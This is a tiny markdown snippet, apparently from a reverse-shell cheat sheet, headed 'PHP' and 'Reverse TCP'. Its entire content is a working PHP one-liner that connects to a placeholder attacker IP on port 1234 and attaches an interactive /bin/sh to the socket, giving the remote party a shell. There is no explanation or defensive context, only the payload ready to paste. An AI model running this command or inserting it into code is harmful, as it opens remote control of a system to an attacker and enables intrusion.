# PHP

## Reverse TCP
php -r '$sock=fsockopen("xx.xx.xx.xx",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

